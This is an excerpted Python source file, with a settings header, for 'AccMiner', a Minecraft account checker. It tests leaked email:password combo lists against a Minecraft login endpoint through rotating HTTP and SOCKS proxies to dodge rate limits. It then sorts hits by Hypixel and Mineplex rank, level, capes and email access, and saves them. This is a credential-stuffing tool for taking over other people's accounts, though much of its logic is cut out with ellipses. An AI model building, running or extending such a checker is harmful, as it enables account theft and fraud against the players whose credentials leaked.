...
#                   -Settings file for AccMiner

AccMiner:

  # Check if current version of AccMiner is latest
...
class Main:
    def __init__(self):
        ...
        print(t)
        print(f'{red}[!] Please remember to configure your settings file before using AccMiner\n')
        ...
        self.start_checker()
        print(f'[{red}Exit{white}] You can now close AccMiner...\n')
        input()
        exit()
            ...
            try:
                ...
                if self.unmigrated:
                    if '@' in email:
                        ...
                        if not reply:
                            Counter.checked += 1
                            Counter.bad += 1
                            if AccMiner.print_bad:
                                self.prints(f'{red}[Bad] {blue}- {red}{line}')
                            if AccMiner.save_bad:
                ...
                if '[]' in texta:
                    ...
                    try:
                        ...
                        if AccMiner.Rank.mineplex or AccMiner.Level.mineplex:
                            if mineplex[0]:
                        ...
                        if AccMiner.Rank.hypixel or AccMiner.Level.hypixel:
                            if not hypixel[2]:
    ...
    def checkmc(self, user, passw, ):
        ...
        retries = 0
        if not AccMiner.Proxy.proxy:
            while True:
                if retries != AccMiner.retries:
                    try:
                        answer = session.post(url=auth_mc, json=payload, headers=jsonheaders,
                                              timeout=AccMiner.timeout)
                        if bad in answer.text:
                            retries += 1
                            sleep(AccMiner.Proxy.sleep)
                            continue
            ...
            while True:
                if retries != AccMiner.retries:
                    ...
                    if proxy.count(':') == 3:
                        ...
                        proxy = proxy
                    locked = AccMiner.Proxy.lock_proxy
                    if proxy in ['', '\n']:
                        try:
                    ...
                    if locked:
                        try:
                            ...
                            locked = False
                    if AccMiner.Proxy.type in ['https', 'http']:
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif AccMiner.Proxy.type in ['socks4', 'socks5']:
                        line = f"{AccMiner.Proxy.type}://{proxy}"
                    ...
                    try:
                        ...
                        if bad in answer.text:
                            ...
                            if AccMiner.Proxy.remove_bad_proxy and len(
                                    self.proxylist) >= AccMiner.Proxy.proxy_remove_limit:
                                if not locked:
                                    try:
                                        self.proxylist.remove(proxy)
                                    except:
                        ...
                        if AccMiner.Proxy.remove_bad_proxy and len(self.proxylist) >= AccMiner.Proxy.proxy_remove_limit:
                            if not locked:
                                try:
                                    self.proxylist.remove(proxy)
                                except:
    ...
    def secure_check(self, token):
        ...
        try:
            if not AccMiner.Proxy.proxy or not AccMiner.Proxy.sfa_proxy:
                try:
                ...
                while True:
                    ...
                    if proxy in ['', '\n']:
                        try:
                            ...
                            pass
                    if AccMiner.Proxy.type == 'http' or AccMiner.Proxy.type == 'https':
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif AccMiner.Proxy.type == 'socks4' or AccMiner.Proxy.type == 'socks5':
                        line = f"{AccMiner.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
    ...
    def mineplex(self, username, combo):
        ...
        if AccMiner.Rank.mineplex or AccMiner.Level.mineplex:
            ...
            if both[1] and AccMiner.Rank.mineplex:
                if both[1] >= AccMiner.Level.mineplex_level:
    ...
    def hypixel(self, uuid, combo):
        ...
        if AccMiner.Rank.hypixel or AccMiner.Level.hypixel:
            ...
            if not both[2]:
                ...
                if both[1] >= AccMiner.Level.hypixel_level:
                    Counter.hypixelhl += 1
    ...
    def rproxies(self):
        while self.stop_time:
            try:
                sleep(AccMiner.Proxy.API.refresh)
                loader = session.get(AccMiner.Proxy.API.api).text.splitlines()
                if AccMiner.proxy_dup:
        ...
        while True:
            try:
                if AccMiner.Proxy.proxy:
                    idk = True
                    loader = []
                    if not AccMiner.Proxy.API.use:
                        print(f"\n{cyan}Please Import Your Proxies List.....")
                        sleep(0.3)
                        loader = open(fileopenbox(title="Load Proxies List", default="*.txt"), 'r', encoding="utf8",
                                      errors='ignore').read().split('\n')
                    elif AccMiner.Proxy.API.use:
                        try:
                            idk = False
                            loader = session.get(AccMiner.Proxy.API.api).text.split("\n")
                            if AccMiner.Proxy.API.refresh >= 30:
                    ...
                    if length_file == 0:
                        ...
                        continue
                    elif length_file == 0 and AccMiner.Proxy.API:
                        print(f'{red}No proxies found in API, AccMiner will exit in 3 seconds...')
                        sleep(3)
                        exit()
    ...
    def get_announcement(self):
        try:
            announcement = session.get(
                'https://raw.githubusercontent.com/FakeSmile/AccMiner/master/announcement').text.split("Color: ")
    ...
    def start_checker(self):
        if AccMiner.threads > len(self.accounts):
            AccMiner.threads = int(len(self.accounts))
        self.get_announcement()
        mainpool = ThreadPool(processes=AccMiner.threads)
        clear()
        print(t)
        ...
        result = f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n' \
            ...
            f'{symbo} Hypixel {AccMiner.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n' \
            f'{symbo} Mineplex {AccMiner.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n\n' \
...
def checkforupdates():
    try:
        gitversion = session.get(
            "https://raw.githubusercontent.com/FakeSmile/AccMiner/master/version.txt").text
        if f'{version}\n' != gitversion:
            print(t)
            ...
            print(f"https://github.com/FakeSmile/AccMiner/releases\nStarting in 5 seconds...{cyan}")
            sleep(5)
            clear()
    except:
        if AccMiner.debug:
...
class AccMiner:
    version_check = bool(settings['AccMiner']['check_for_updates'])
    retries = int(settings['AccMiner']['retries'])
    timeout = int(settings['AccMiner']['timeout']) / 1000
    threads = int(settings['AccMiner']['threads'])
    combo_dup = bool(settings['AccMiner']['combo_duplicates'])
    proxy_dup = bool(settings['AccMiner']['proxy_duplicates'])
    emailaccess = bool(settings['AccMiner']['mail_access'])
    ranktype = bool(settings['AccMiner']['save_ranked_type'])
    print_bad = bool(settings['AccMiner']['print_bad'])
    save_bad = bool(settings['AccMiner']['save_bad'])
    debug = bool(settings['AccMiner']['debugging'])

    class Cape:
        lb = bool(settings['AccMiner']['capes']['liquidbounce'])
        optifine = bool(settings['AccMiner']['capes']['optifine'])
        laby = bool(settings['AccMiner']['capes']['labymod'])
        mojang = bool(settings['AccMiner']['capes']['mojang'])

    class Rank:
        mineplex = bool(settings['AccMiner']['rank']['mineplex'])
        hypixel = bool(settings['AccMiner']['rank']['hypixel'])
        hivemc = bool(settings['AccMiner']['rank']['hivemc'])
        veltpvp = bool(settings['AccMiner']['rank']['veltpvp'])

    class Level:
        hypixel = bool(settings['AccMiner']['level']['hypixel'])
        mineplex = bool(settings['AccMiner']['level']['mineplex'])
        hypixel_level = int(settings['AccMiner']['level']['hypixel_level'])
        mineplex_level = int(settings['AccMiner']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(settings['AccMiner']['proxy']['proxy'])
        type = str(settings['AccMiner']['proxy']['proxy_type']).lower()
        lock_proxy = bool(settings['AccMiner']['proxy']['lock_proxy'])
        remove_bad_proxy = bool(settings['AccMiner']['proxy']['remove_bad_proxy'])
        proxy_remove_limit = int(settings['AccMiner']['proxy']['proxy_remove_limit']) + 1
        sfa_proxy = bool(settings['AccMiner']['proxy']['proxy_for_sfa'])
        sleep = int(settings['AccMiner']['proxy']['sleep_proxyless'])

        class API:
            use = bool(settings['AccMiner']['proxy']['api']['use'])
            api = str(settings['AccMiner']['proxy']['api']['api_link'])
            refresh = int(settings['AccMiner']['proxy']['api']['refresh_time'])
